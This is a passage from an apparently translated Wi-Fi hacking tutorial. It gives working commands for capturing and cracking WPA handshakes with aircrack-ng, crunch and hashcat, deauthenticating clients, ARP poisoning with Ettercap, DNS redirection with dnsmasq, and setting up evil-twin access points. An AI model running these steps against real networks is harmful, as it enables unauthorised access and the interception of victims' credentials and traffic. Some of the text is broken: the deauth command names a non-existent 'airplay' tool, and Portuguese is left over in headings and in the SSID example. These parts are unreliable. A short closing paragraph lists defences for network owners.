    sudo airmon-ng start wlan0

    ```


    Capture the Handshake:


    ```bash

    sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

    ```


    Force Deauthentication to Capture the Handshake:


    ```bash

    sudo airplay --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

    ```


    ## Password Cracking with `Aircrack-ng`


    Dictionary File Usage:


    ```bash

    sudo aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap

    ```


    Brute Force with `Aircrack-ng`: Create a password list file with all possible
    combinations and use it with `Aircrack-ng`:


    ```bash

    crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -o
    brute-force-list.txt

    sudo aircrack-ng -w brute-force-list.txt -b 00:11:22:33:44:55 capture-01.cap

    ```


    ## Using `Hashcat`


    Convert Handshake to `Hashcat` Format:


    ```bash

    hcxpcaptool -z capture.hccapx capture-01.cap

    ```


    Password Cracking with `Hashcat`:


    ```bash

    hashcat -m 2500 capture.hccapx wordlist.txt

    ```


    Wi-Fi password cracking is a crucial technique that involves varied methods including
    capturing handshakes, brute force and dictionary attacks, and the use of specialized
    tools such as `Aircrack-ng`, `Hashcat` and `John the Ripper`. Protecting your
    network against these attacks requires implementing strong and complex passwords,
    regularly updating passwords, using `WPA3`, disabling `WPS`, MAC filtering, network
    segmentation, and continuous monitoring. Understanding and applying these techniques
    allows cybersecurity professionals to effectively secure Wi-Fi networks, ensuring
    data security and network integrity.


    # Capítulo 6: Ataques Man-in-the-Middle


    ## Introduction to MITM Attacks


    Man-in-the-Middle (`MITM`) attacks are one of the most serious and common threats
    on Wi-Fi networks. In a `MITM` attack, the attacker intercepts and possibly modifies
    communication between two parties without them knowing. This allows the attacker
    to steal sensitive information, such as login credentials and personal data, or
    inject malicious data into the communication.


    ## MITM Attack Concept


    A `MITM` attack occurs when an attacker positions himself between two devices
    that are communicating. The attacker can then intercept, record, and alter the
    data transmitted between these devices. There are several techniques for carrying
    out a `MITM` attack, including `ARP spoofing`, `DNS redirection`, and creating
    fake access points.


    ## Executing MITM on Wi-Fi Networks


    To perform a `MITM` attack on a Wi-Fi network, the attacker must first gain access
    to the network. Once connected, the attacker can use various techniques to intercept
    network traffic.


    ## Spoofing de ARP


    `ARP` (`Address Resolution Protocol`) spoofing is a common technique used in `MITM`
    attacks. `ARP` is responsible for mapping IP addresses to MAC addresses on the
    local network. `ARP spoofing` involves sending spoofed `ARP` messages to associate
    the attacker''s MAC address with the IP address of a legitimate device on the
    network.


    - `Using Ettercap`: `Ettercap` is a powerful tool for performing `ARP spoofing`
    attacks.


    Installation:


    ```bash

    sudo apt install ettercap-graphical

    ```


    Execution:


    Start `Ettercap` in graphical mode:


    ```bash

    sudo ettercap -G

    ```


    1. Select the network interface and start sniffing.

    2. Add victims (target devices) and select `ARP poisoning` as the attack method.

    3. Launch the attack to intercept traffic between victims.


    ## DNS Redirection


    `DNS redirection` involves manipulating DNS responses to redirect traffic destined
    for a legitimate website to a malicious website controlled by the attacker.


    - `Using Dnsmasq`: `Dnsmasq` is a tool that can be configured to provide DNS and
    DHCP services, facilitating DNS redirection.


    Installation:


    ```bash

    sudo apt install dnsmasq

    ```


    Settings: Edit the `Dnsmasq` configuration file (`/etc/dnsmasq.conf`) to add redirection
    entries:


    ```

    address=/example.com/192.168.1.100

    ```


    In this example, any request for `example.com` will be redirected to `192.168.1.100`,
    the IP address of the malicious server.


    ## Creating Fake Access Points


    Creating a fake access point (`Evil Twin`) is another technique used in `MITM`
    attacks. The attacker creates an access point with the same SSID as a legitimate
    access point, tricking users into connecting to the fake access point.


    - `Uso do Airbase-ng`: `Airbase-ng` is a tool from the `Aircrack-ng` package used
    to create fake access points.


    Installation:


    ```bash

    sudo apt install aircrack-ng

    ```


    Execution:


    Put the network interface in monitor mode:


    ```bash

    sudo airmon-ng start wlan0

    ```


    Create the fake access point:


    ```bash

    sudo airbase-ng -e "NomeDoSSID" wlan0mon

    ```


    This command creates an access point with the SSID "SSIDName". Users who connect
    to this access point will have their traffic intercepted by the attacker.


    # Tools Used in MITM Attacks


    Several tools make it easy to perform `MITM` attacks on Wi-Fi networks. Some of
    the most popular include `Ettercap`, `Wireshark`, and `MITMf`.


    # Ettercap


    `Ettercap` is a network sniffing and spoofing tool that supports various `MITM`
    techniques, including `ARP spoofing` and data injection.


    Installation:


    ```bash

    sudo apt install ettercap-graphical

    ```


    Functionalities:


    - `ARP spoofing`

    - `DNS spoofing`

    - `Packet injection`

    - `Password capture`


